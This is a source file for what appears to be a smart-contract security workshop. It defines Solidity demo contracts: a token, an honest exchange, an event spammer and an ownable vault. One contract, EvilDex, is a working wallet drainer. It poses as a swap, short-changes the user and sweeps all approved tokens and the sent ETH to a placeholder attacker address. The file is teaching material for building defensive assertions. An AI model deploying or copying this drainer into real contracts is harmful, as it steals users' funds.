/**
 * The demo world. Ordinary Solidity, compiled in-process. Read it once, then forget it:
 * the interesting code in this workshop is the *assertions* in each step file.
 *
 *  - Token     minimal ERC-20 (balances at slot 0, allowances at slot 1). `emitEvents=false` makes a
 *              non-compliant "silent" token that moves balances without Transfer events.
 *  - HonestDex swap(token) pays 1000 tokens per 1 wei of ETH.
 *  - EvilDex   same `swap(token)` calldata, but sweeps your approved tokens. Unless `fair`, it also short-changes you.
 *  - Spammer   emits lots of junk events (used to attack assertion gas in step 8).
 *  - Vault     owned by whoever is in slot 0 (used by the challenge).
 */
import { solidity } from "./compile.js";

const SOURCE = /* solidity */ `
// SPDX-License-Identifier: CC0-1.0
pragma solidity ^0.8.24;

contract Token {
  mapping(address => uint256) public balanceOf;                       // slot 0
  mapping(address => mapping(address => uint256)) public allowance;   // slot 1
  string public name;
  bool public immutable emitEvents;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string memory n, bool e) { name = n; emitEvents = e; }

  function mint(address to, uint256 amount) external { balanceOf[to] += amount; _t(address(0), to, amount); }
  function approve(address spender, uint256 amount) external returns (bool) {
    allowance[msg.sender][spender] = amount;
    if (emitEvents) emit Approval(msg.sender, spender, amount);
    return true;
  }
  function transfer(address to, uint256 amount) external returns (bool) { _move(msg.sender, to, amount); return true; }
  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
    uint256 a = allowance[from][msg.sender];
    if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
    _move(from, to, amount);
    return true;
  }
  function _move(address from, address to, uint256 amount) internal { balanceOf[from] -= amount; balanceOf[to] += amount; _t(from, to, amount); }
  function _t(address from, address to, uint256 amount) internal { if (emitEvents) emit Transfer(from, to, amount); }
}

contract HonestDex {
  function swap(Token out) external payable { out.transfer(msg.sender, msg.value * 1000); }
}

contract EvilDex {
  address immutable attacker;
  bool immutable fair;
  Token[] public loot;
  constructor(address a, bool f, Token[] memory l) { attacker = a; fair = f; loot = l; }

  function swap(Token out) external payable {
    out.transfer(msg.sender, fair ? msg.value * 1000 : 1); // "your swap"
    for (uint256 i = 0; i < loot.length; i++) {
      uint256 amt = loot[i].allowance(msg.sender, address(this));
      uint256 bal = loot[i].balanceOf(msg.sender);
      if (bal < amt) amt = bal;
      if (amt > 0) loot[i].transferFrom(msg.sender, attacker, amt);
    }
    (bool ok, ) = attacker.call{value: msg.value}("");
    require(ok);
  }
}

contract Spammer {
  event Junk(uint256 i);
  function spam(uint256 n) external { for (uint256 i = 0; i < n; i++) emit Junk(i); }
}

contract Vault {
  address public owner;                          // slot 0
  uint256 public secret;                         // slot 1
  constructor() { owner = msg.sender; }
  function setSecret(uint256 s) external { require(msg.sender == owner); secret = s; }
  function transferOwnership(address o) external { require(msg.sender == owner); owner = o; }
}
`;

const compiled = (name: string) => solidity(name, SOURCE);
export const TokenC = compiled("Token");
export const HonestDexC = compiled("HonestDex");
export const EvilDexC = compiled("EvilDex");
export const SpammerC = compiled("Spammer");
export const VaultC = compiled("Vault");

/** Where the attacker in our stories receives the loot. */
export const ATTACKER = "0x000000000000000000000000000000000000bad1" as const;
